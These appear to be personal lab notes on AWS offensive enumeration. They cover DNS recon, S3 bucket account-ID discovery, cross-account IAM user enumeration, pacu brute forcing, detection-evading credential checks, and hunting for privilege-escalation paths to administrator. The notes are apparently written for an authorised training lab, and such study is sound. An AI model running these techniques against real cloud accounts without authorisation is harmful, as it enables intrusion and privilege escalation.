# AWS Cloud Environment Enumeration

* The Route53 as routing service in AWS.
* The EC2 instance is a virtual machine in the AWS!
* The S3 is a datastore in AWS. [Methods for accessing a S3 bucket](https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-bucket-intro.html).

## Labs exersises require

* Initial configuration on kali linux
* 10-15 min after the deployment
* Result from AWS deployment  
  * Public DNS IP Address
  * Domain name of the target
  * Credentials for the IAM user attacker
    ACCESS_KEY_ID
    SECRET_ACCESS_KEY

```shell
# custom DNS from AWS labs must be the FIRST in the list
sudo gedit /etc/resolv.conf
cat /etc/resolv.conf
nameserver 44.205.254.229
...
nameserver 1.1.1.1

# verify that DNS IP is responding as expected
host offseclab.io 44.205.254.229
# verify that DNS resolver is configured correclty
host offseclab.io
```

After finishing AWS labs restart network service to clean up revolv.conf

```shell
sudo systemctl restart networking
```

## AWS DNS Recon and Find Authoritive DNS

* host to lookup domain name
* -t ns to list name server entries

```shell
# Clear all or specific ARP entries
ip -s -s neigh flush all
arp -d 192.168.1.1

# Get the authoritive DNS server for the domain
host -t ns offseclab.io
offseclab.io name server ns-30-c.gandi.net.
offseclab.io name server ns-202-b.gandi.net.
offseclab.io name server ns-196-a.gandi.net.

# Verify AWS
whois awsdns-00.com | grep "Registrant Organization"

# Get public host IP for the domain
host offseclab.io

offseclab.io has address 217.70.184.38
offseclab.io mail is handled by 10 spool.mail.gandi.net.
offseclab.io mail is handled by 50 fb.mail.gandi.net.

# Get public host IP for sub domain services
host www.offseclab.io

www.offseclab.io is an alias for webredir.vip.gandi.net.
webredir.vip.gandi.net has address 217.70.184.50

# Get reverse lookup information
host 217.70.184.38

50.184.70.217.in-addr.arpa domain name pointer webredir.vip.gandi.net.
```

## AWS DNS Automated Recon

```shell
# Find subdomain by brute forcing with dns.txt
dnsenum offseclab.io --threads 100

Brute forcing with /usr/share/dnsenum/dns.txt:                                                                                                                            
_______________________________________________                                                                                                                           
                                                                                                                                                                          
www.offseclab.io.                        3136     IN    CNAME    webredir.vip.gandi.net.                                                                                  
webredir.vip.gandi.net.                  3556     IN    A        217.70.184.50
webmail.offseclab.io.                    4502     IN    CNAME    webmail.gandi.net.
webmail.gandi.net.                       372      IN    A        217.70.178.6

```

```shell
# Find typical DNS verification information in TXT records
host -t txt offseclab.io target-dns-server-IP
```


## AWS DNS Recon Extension OSINT Framework

* Perform enumeration **recursively for each new domain, subdomain and public IP** to get full environment information
* Follow guideline and use tools from [OSINT-Framework](https://osintframework.com/) to gather further valuable information

## AWS Automate Enum

Cloud enumeration tools are avaialable for kali

* Use [cloud-enum](https://www.kali.org/tools/cloud-enum/)
* Use [cloudbrute](https://www.kali.org/tools/cloudbrute/)

CloudEnum

* --keyword KEYWORD
* --keyfile KEYFILE
* --mutations add mutation to provided names
* --quick-scan to disable mutations
* --disalbe-xxx other CSPs

```shell
sudo apt install cloud-enum
cloud_enum --help

# Prepare the brute force keyfile
for key in "public" "private" "dev" "prod" "development" "production"; do echo "offseclab-assets-$key-axevtewi"; done | tee /tmp/keyfile.txt

cloud_enum --keyword offseclab-assets-public-axevtewi --quickscan --disable-azure --disable-gcp
cloud_enum --keyfile /tmp/keyfile.txt--quickscan --disable-azure --disable-gcp
```

Public faced services do have names like

```plain
AWS
s3.amazonaws.com
awsapps.com

Azure
web.core.windows.net
file.core.windows.net
blob.core.windows.net
azurewebsites.net
cloudapp.net

GCP
appspot.com
storage.googleapis.com
```

Obtain Information from Publicly Shared Resources
Obtain account IDs From Public S3 Buckets
Enumerate IAM Users in Other Accounts

## AWS CLI Configure Profile

* Install AWS CLI
* Configure named profile for authentication
* Use named profile to get identity

```shell
sudo apt install -y awscli

# use named profile
aws configure --profile attacker

AWS Access Key ID []: AKIAQO...
AWS Secret Access Key []: cOGzm...
Default region name []: us-east-1
Default output format []: json

## get identity
aws --profile attacker sts get-caller-identity
{
    "UserId": "ABCDEFGHIJKLMNOPOQ",
    "Account": "123456789012",
    "Arn": "arn:aws:iam::123456789012:user/attacker"

```

## AWS CLI Enum via EC2 Shared Images

Scenario

* Lookup public available shared resources including
* publicly shared Amazon Machine Images (AMIs) aka pre-build images used by EC2 VMs
* Publicly shared Elastic Block Storage (EBS) snapshots aka volumes images used by EC2 VMs
* Relational Databases (RDS) snapshots

```shell
# Find attacked account by filters name=values
aws --profile attacker ec2 describe-images --executable-users all --filters "Name=name,Values=*Offsec*"
aws --profile attacker ec2 describe-images --owners amazon --executable-users all

"Hypervisor": "xen",
"Name": "Offseclab Base AMI",
...
"OwnerId": "123456789012"

# Get shared EC2 pre-build images for the target account
aws --profile attacker ec2 describe-images --owners 123456789012 --executable-users all
aws --profile attacker ec2 describe-images --filters "Name=name,Values=*Offsec*"

# Get shared EC2 snapshots for the target account
aws --profile attacker ec2 describe-snapshots --owners 123456789012
aws --profile attacker ec2 describe-snapshots --filters "Name=description,Values=*Offsec*"
```

## AWS CLI Enum via S3 Shared Resources

Scenario

* Public shared Images are not available
* Use curl -s to download source code of public html site
* Find S3 bucket references or even account credentials
* Find S3 bucket account by using read condition (digit per digit)

Attacker

* Create enum user and AWS access key
* Create profile for user enum with the generated AWS access key
* Ensure user enum can NOT list S3 bucket yet
* Create conditional `policy-s3-read.json` to allow enum user to read
* Assign conditional read policy the enum user and verify
* Try Read, if denied continue with first digit else with next ones

```shell
# Find public S3 bucket references on a webpage
curl -s www.offseclab.io | grep -o -P 'offseclab-assets-public-\w{8}'

# List public S3 bucket content or ojbects
aws --profile attacker s3 ls offseclab-assets-public-kaykoour
    PRE sites/

# Create enum user and AWS access key
aws --profile attacker iam create-user --user-name enum
    "User": {
        "Path": "/",
        "UserName": "enum",
        "UserId": "ALKI1234...",
        "Arn": "arn:aws:iam::123456789012:user/enum",
        "CreateDate": "2025-11-12T14:50:52+00:00"
    }

aws --profile attacker iam create-access-key --user-name enum
    "AccessKey": {
        "UserName": "enum",
        "AccessKeyId": "ALKI1234...",
        "Status": "Active",
        "SecretAccessKey": "sec4+ALKI...",
        "CreateDate": "2025-11-12T14:53:25+00:00"
    }

# Create profile for user enum with the generated AWS access key
aws configure --profile enum
aws --profile enum sts get-caller-identity
    ...

# Ensure user enum can NOT list S3 bucket yet 
aws --profile enum s3 ls target-assets-public-mstewdsa
aws --profile enum s3 ls offseclab-assets-private-kaykoour

    An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied  

# Create conditional read policy to allow enum user to read only if ressource owner account digits are correct guessed (e.g. 0*)

cat policy-s3-conditional-read.json

{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "AllowResourceAccount",
            "Effect": "Allow",
            "Action": [
                "s3:ListBucket",
                "s3:GetObject"
            ],
            "Resource": "*",
            "Condition": {
                "StringLike": {"s3:ResourceAccount": ["0*"]}
            }
        }
    ]
}

# Assign conditional read policy the enum user and verify

aws --profile attacker iam put-user-policy \
--user-name enum \
--policy-name s3-read \
--policy-document file://policy-s3-conditional-read.json

aws --profile attacker iam list-user-policies --user-name enum

{
    "PolicyNames": [
        "s3-read"
    ]
}

# Try Read, if denied continue with first digit else with next ones
aws --profile enum s3 ls target-assets-public-mstewdsa

cat policy-s3-read.json
...
  "Condition": {
                "StringLike": {"s3:ResourceAccount": ["12*"]}
            }

```

## Automate AWS Enum via S3 Shared Resources via S3-account-search

This tool lets you find the account id an S3 bucket belongs too.

> For this to work you need to have at least one of these permissions:
> Permission to download a known file from the bucket (s3:getObject).
> Permission to list the contents of the bucket (s3:ListBucket).
> Additionally, you **will need a role** that you can assume with (one of) these permissions on the bucket you're examining

Scenario

* Automate the S3 enumeration to get resource owner
* Use [s3-account-search tools](https://github.com/WeAreCloudar/s3-account-search)
* Requires: AWS **roles instead of users**
* More info: `https://cloudar.be/awsblog/finding-the-account-id-of-any-public-s3-bucket/`

Attacker

```shell
# install tool
python3 -m venv s3-account-search 
source s3-account-search/bin/activate
pip install s3-account-search

# create a enum user witin the attacker profile
aws --profile attacker iam create-user --user-name enum
...
   "UserName": "enum",
   "Arn": "arn:aws:iam::ACCOUNT-ID:user/enum",

# create a trust policy for user enum
cat trust-policy-s3-read.json

{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "AWS": "arn:aws:iam::ACCOUNT-ID:user/enum"
      },
      "Action": "sts:AssumeRole"
    }
  ]
}

# create a role and allow enum user to the action "sts::AssumeRole"
aws --profile attacker iam create-role \
    --role-name s3_read \
    --assume-role-policy-document file://trust-policy-s3-read.json

aws --profile attacker iam update-assume-role-policy \
    --role-name s3_read \
    --policy-document file://trust-policy-s3-read.json

{
    "Role": {
        "Path": "/",
        "RoleName": "s3_read",
        "RoleId": "ARO...",
        "Arn": "arn:aws:iam::ROLE-ID:role/s3_read",
        "CreateDate": "2025-11-12T16:39:12+00:00",
        "AssumeRolePolicyDocument": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Effect": "Allow",
                    "Principal": {
                        "AWS": "arn:aws:iam::ACCOUNT-ID:user/enum"
                    },
                    "Action": "sts:AssumeRole"
                }
            ]
        }
    }
}

# assign list and get read permission to role s3_read

cat allow-put-role-policy.json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": "iam:PutRolePolicy",
      "Resource": "*"
    }
  ]
}

aws --profile attacker iam put-user-policy \
  --user-name enum \
  --policy-name allow-put-role-policy \
  --policy-document file://allow-put-role-policy.json

cat policy-s3-read.json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "AllowResourceAccount",
            "Effect": "Allow",
            "Action": [
                "s3:ListBucket",
                "s3:GetObject"
            ],
            "Resource": "*"
        }
    ]
}

aws --profile enum iam put-role-policy \
  --role-name s3_read \
  --policy-name s3-read-access \
  --policy-document file://policy-s3-read.json

# test Assume role
aws --profile enum sts assume-role --role-arn arn:aws:iam::ROLE-ID:role/s3_read --role-session-name s3_read_unique_session_name

# Finally s3-account-search
s3-account-search --profile enum arn:aws:iam::ACCOUNT-ID:role/s3_read s3://offseclab-assets-private-mebfydvw

Starting search (this can take a while)
found: 0
found: 0..hidden..7
```

```shell
# with a bucket
s3-account-search arn:aws:iam::123456789012:role/s3_read s3://my-bucket

# with an object
s3-account-search arn:aws:iam::123456789012:role/s3_read s3://my-bucket/path/to/object.ext

# You can also leave out the s3://
s3-account-search arn:aws:iam::123456789012:role/s3_read my-bucket

# Or start from a specified source profile
s3-account-search --profile enum arn:aws:iam::123456789012:role/s3_read s3://my-bucket
```

## AWS CLI Enum Account IAM identities

Scenario

* AWS Account ID of target is known
* Want to enumerate other IAM accounts
* If an IAM identity does not exist it throws an errpr
* Source: [Cross-Account-Policies](https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_evaluation-logic-cross-account.html)

Attacker

* Create an new S3 bucket for cross-account attack
* Try to assign a bucket read policy for a user
* Enumerate the invalid users, by the error message stating 'Invalid principal in policy'

```shell
# Create an new S3 bucket for cross-account attack
aws --profile attacker s3 mb s3://offseclab-dummy-bucket-$RANDOM-$RANDOM-$RANDOM

make_bucket: offseclab-dummy-bucket-13460-6400-24670

cat grant-s3-bucket-read.json

{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "AllowUserToListBucket",
            "Effect": "Allow",
            "Resource": "arn:aws:s3:::offseclab-dummy-bucket-13460-6400-24670",
            "Principal": {
                "AWS": ["arn:aws:iam::123456789012:user/cloudadmin"]
            },
            "Action": "s3:ListBucket"

        }
    ]
}

# Try to assign a bucket read policy for a user
aws --profile attacker s3api put-bucket-policy \
    --bucket offseclab-dummy-bucket-13460-6400-24670 \
    --policy file://grant-s3-bucket-read.json

An error occurred (MalformedPolicy) when calling the PutBucketPolicy operation: Invalid principal in policy

```

## AWS CLI Enum Account IAM identities with pacu

Scenario

* Automate cross-account enumeration of IAM identities
* Use kali linux tool [pacu](https://www.kali.org/tools/pacu/)

Attacker

* Import attacker keys
* pacu# iam__enum_roles
* pacu# iam__enum_users

```shell
# install pacu
sudo apt install pacu

# Create list users or roles to test
echo -n "lab_admin
security_auditor
content_creator
student_access
lab_builder
instructor
network_config
monitoring_logging
backup_restore
content_editor" > /tmp/role-names.txt

# Run pacu to create a session and import attacker keys
pacu
import_keys attacker

# enum users and roles
run iam__enum_users --word-list /tmp/user-names.txt --account-id TARGET-ACCOUNT-ID
run iam__enum_roles --word-list /tmp/role-names.txt --account-id TARGET-ACCOUNT-ID

# assume role
assume_role "arn:aws:iam::123456789012:role/cloudadmin

# enum vpcs
run ec2__enum --regions us-east-1

# all show session
data

```

## AWS CLI IAM Recon using Target Credentials

Scenario

* AWS enumeration (with no IoC) and Initial compromise via AssumeRole is done
* Obtained target credentials and configure a profile for interaction
* Start Recon via CLI using
* Goal: Avoid detection by monitoring and alerting

Attack

```shell
# stealthy mode of account verification using the target profile
# requires non-existent lambda function
aws --profile target lambda invoke --function-name arn:aws:lambda:us-east-1:123456789012:function:nonexistent-function outfile
...
An error occurred (AccessDeniedException) when calling the Invoke operation: User: arn:aws:iam::619071316869:user/support/clouddesk

# non-stealthy mode of account verification using the attacker profile
# requires access-key-id of the target
aws --profile attacker sts get-access-key-info --access-key-id AID...

{
    "Account": "123456789012"
}

# non-stealthy mode of account verification using the target profile
# avoid query of target caller identity, due to logging and monitoring
aws configure --profile target
aws --profile target sts get-caller-identity 

{
    "UserId": "AID...",
    "Account": "123456789012",
    "Arn": "arn:aws:iam::123456789012:user/support/clouddesk"
}

```

## AWS CLI IAM Recon List Policies using Target Account

Scenario

* Initial compromise with target credential
* Understand the permissions of the compromised user
* Review user and group policies and managed policies
* Sources:
* e.g. [JobFunctions](https://docs.aws.amazon.com/aws-managed-policy/latest/reference/SupportUser.html)
* e.g. [SupportUser](https://docs.aws.amazon.com/aws-managed-policy/latest/reference/SupportUser.html)

```shell
# list user policies
aws --profile target iam list-user-policies --user-name clouddesk
aws --profile target iam list-attached-user-policies --user-name clouddesk-plove
{
    "AttachedPolicies": [
        {
            "PolicyName": "deny_challenges_access",
            "PolicyArn": "arn:aws:iam::123456789012:policy/deny_challenges_access"
        }
    ]
}

# list user groups
aws --profile target iam list-groups-for-user --user-name clouddesk

{
    "Groups": [
        {
            "Path": "/support/",
            "GroupName": "support",
            "GroupId": "AG...",
            "Arn": "arn:aws:iam::123456789012:group/support/support",
            "CreateDate": "2025-11-14T08:28:52+00:00"
        }
    ]
}

# list user policies
# e.g. job-function is a aws management policy
aws --profile target iam list-group-policies --group-name support
aws --profile target iam list-attached-group-policies --group-name support
{
    "AttachedPolicies": [
        {
            "PolicyName": "SupportUser",
            "PolicyArn": "arn:aws:iam::aws:policy/job-function/SupportUser"
        }
    ]
}

# list aws managed policies version and permission
aws --profile target iam list-policy-versions --policy-arn "arn:aws:iam::aws:policy/job-function/SupportUser"
...
    "Versions": [
        {
            "VersionId": "v9",
            "IsDefaultVersion": true,
            "CreateDate": "2025-07-10T17:07:07+00:00"
        },
...

# BOOM!
# support user can read, list and describe all resources
aws --profile target iam get-policy-version --policy-arn arn:aws:iam::aws:policy/job-function/SupportUser --version-id v9

     "Effect": "Allow",
     "Resource": "*"

```

## AWS CLI IMS Recon with Pacu (noisy!!!)

Scenario

* If we don't find any usefull permission we can do a brute force
* ATTENTION: it triggers monitoring alarms and does extensive logging

```shell
pacu#

# use keys and assume roles
import_key target
swap_keys target
assume_role role-arn

run iam__enum_users_roles_policies_groups
data IAM Users
data IAM Roles
data IAM Groups
data IAM Policies

run iam__bruteforce_permissions --services EC2
data EC2

# list all services
services
```

## Other AWS Recon tools

* [aws cheat sheat](https://cybr.com/courses/introduction-to-aws-enumeration/lessons/cheat-sheet-iam-enumeration-cli-commands-2/)
* [aws enumeration](https://cybr.com/courses/introduction-to-aws-enumeration/lessons/lab-introduction-to-aws-iam-enumeration-2/)
* [pacu](https://github.com/RhinoSecurityLabs/pacu)
* [aws_enum](https://github.com/initstring/aws_enum)

## AWS CLI Enum Ressources

Scenario

* Known target credentials with get and list permissions or with `iam:Get*` permission
* Enumerate resources by using server side filters and client side JMESPath query
* [JMESPath Example](https://jmespath.org/examples.html)

```shell
# get aws managed policy permisisons
aws --profile target iam get-policy-version --policy-arn arn:aws:iam::aws:policy/job-function/SupportUser --version-id v8 | grep "iam"
aws --profile target iam help | grep -E "list-|get-|generate-"

# get a summary to decide on next steps
aws --profile target iam get-account-summary | tee summary.json
...
  "Users",
  "Roles",
  "Groups",
  "MFADevices": 0
  "AccountMFAEnabled": 0,
  "Providers": 1,

# read all account details
# requires: iam:Get* or GetAccountAuthorizationDetails permission
aws --profile target iam get-account-authorization-details | tee account-details.json

aws --profile target iam get-account-authorization-details --filter User | tee users.json
aws --profile target iam get-account-authorization-details --filter Role | tee roles.json
aws --profile target iam get-account-authorization-details --filter Group | tee groups.json
aws --profile target iam get-account-authorization-details --filter LocalManagedPolicy | tee policies.json
aws --profile target iam get-account-authorization-details --filter AWSManagedPolicy | tee aws-managed-policies.json


# query locally with jp tool for imporatant
cat users.json | jp "UserDetailList[?contains(UserName, 'admin') && contains(Path, 'admin')]"
cat users.json | jp "UserDetailList[?contains(UserName, 'admin')]"
cat users.json | jp "GroupDetailList[?Path=='/admin/']"   
cat groups.json | jp "GroupDetailList[?Path=='/admin/']"  

# query aws server with JMES query for important details
aws --profile target iam get-account-authorization-details \
--filter User \
--query "UserDetailList[].{Name: UserName,Path: Path,Groups: GroupList}"
aws --profile target iam get-account-authorization-details \
--filter Group \
--query "GroupDetailList[].{Name: GroupName,Path: Path,GroupPolicy: GroupPolicyList,AttachedManaged: AttachedManagedPolicies}"
aws --profile target iam get-account-authorization-details \
--filter Role \
--query "RoleDetailList[].{Name: RoleName,Path: Path,RolePolicy: RolePolicyList,AttachedManaged: AttachedManagedPolicies}"

#  list user and devices details
aws --profile target iam list-users | tee user.json
aws --profile target iam list-roles | tee roles.json
aws --profile target iam list-groups | tee groups.json
aws --profile target iam list-mfa-devices | tee mfadevices.json
aws --profile target iam list-saml-providers | tee samlprovider.json

# list and read policies details
aws --profile target iam list-policies --scope Local --only-attached | tee tee customer-defined-policies.json

aws --profile target iam list-user-policies
aws --profile target iam get-user-policy
aws --profile target iam list-role-policies
aws --profile target iam get-role-policy
aws --profile target iam list-group-policies
aws --profile target iam get-group-policy

aws --profile target list-attached-user-policies
aws --profile target list-attached-group-policies
aws --profile target list-attached-role-policies
```

## AWS CLI Privilege Escalation to Admin

Scenario

* Known Target Credentials with insufficient permissions
* Identity a Privilege Escalation Path to Admin
* Requires: Policies with iam:"*", or iam:AddUserToGroup permissions to **add user to admin group**
* Requires: Policies with iam:"*", or iam:CreateAccessKey permissions to **modify admin credentials**
* Goal: [AdministratorAccess](https://docs.aws.amazon.com/aws-managed-policy/latest/reference/AdministratorAccess.html)

```shell
aws --profile target iam get-account-authorization-details --filter User | tee users.json 
aws --profile target iam get-account-authorization-details --filter Group | tee groups.json 
aws --profile target iam get-account-authorization-details --filter LocalManagedPolicy | tee policies.json
aws --profile target iam get-account-authorization-details --filter AWSManagedPolicy | tee aws-managed-policies.json


# Important: Tags are used Attribute Based Access Control (ABAC)
cat users.json | jp "UserDetailList[?contains(UserName, 'admin') && contains(GroupList, 'admin')].{Arn: Arn, Name: UserName, Groups: GroupList, Tags: Tags}"

[
  {
    "Arn": "arn:aws:iam::123456789012:user/admin/admin",
    "Groups": [
      "admin"
      ...
    ],
    "Name": "admin",
    "Tags": [
      {
        "Key": "Project",
        "Value": "important"
      },
      ...
    ]
  }
]

# Important: Policy name indicate permissive policies
cat users.json | jp "UserDetailList[].{User: UserName, Policies: UserPolicyList, AttachedPolicies: AttachedManagedPolicies}"

# Important: Policy name of attached policies indicate permissive policies
cat groups.json | jp "GroupDetailList[?contains(GroupName, 'admin')].AttachedManagedPolicies"

  [
    {
      "PolicyArn": "arn:aws:iam::123456789012:policy/some/some",
      "PolicyName": "some_admin"
    },
    {
      "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess",
      "PolicyName": "AdministratorAccess"
    },
  ]

# Boom!
# Important: Search for admin policies and policies with wildcards like "iam:*"
cat policies.json | jp "Policies[?contains(@.PolicyName,'admin')].PolicyName"
cat policies.json | jp "Policies[?PolicyName=='some_admin'].PolicyVersionList[].Document.Statement[?contains(@.Action, '*') || @.Action == '*']"

    [
        {
            "Action": "iam:*",
            "Effect": "Allow",
            "Resource": [
                "arn:aws:iam::123456789012:user/some/*",
                "arn:aws:iam::123456789012:group/some/*",
                "arn:aws:iam::123456789012:role/some/*",
                "arn:aws:iam::123456789012:policy/some/*"
            ],
            "Sid": "AllowAllIAMActionsInUserPath"
        },
        {
            "Action": "iam:*",
            "Condition": {
                "StringEquals": {
                    "aws:ResourceTag/Project": "some"
                }
            },
            "Effect": "Allow",
            "Resource": "arn:aws:iam::*:user/*",
            "Sid": "AllowAllIAMActionsInGroupMembers"
        }
    ]


# Boom!
# Inportant: AdministratorAccess has full access
cat aws-managed-policies.json | jp "Policies[?PolicyName=='AdministratorAccess']" 
...    
    "Statement": [
        {
            "Effect": "Allow",
            "Action": "*",
            "Resource": "*"
        }
```
